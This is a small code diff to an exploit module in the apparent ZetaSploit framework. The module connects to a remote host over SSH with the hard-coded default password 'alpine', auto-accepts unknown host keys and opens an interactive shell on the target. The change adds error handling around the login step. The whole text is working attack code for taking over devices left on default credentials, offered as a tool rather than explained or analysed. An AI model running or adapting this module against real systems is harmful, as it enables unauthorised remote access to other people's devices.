@@ -91,9 +91,13 @@ class ZetaSploitModule:
         username = self.options['USERNAME']['Value']
         remote_host = self.options['RHOST']['Value']
         self.helper.output(self.badges.G + "Exploiting " + remote_host + "...")
-        ssh = paramiko.SSHClient()
-        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-        ssh.connect(remote_host, username=username, password='alpine')
+        try:
+            ssh = paramiko.SSHClient()
+            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+            ssh.connect(remote_host, username=username, password='alpine')
+        except:
+            self.helper.output(self.badges.E + "Exploit failed!")
+            return
         self.helper.output(self.badges.S + "Connecting to " + remote_host + "...")
         self.shell(ssh)
         self.helper.output(self.badges.G + "Closing connection...")
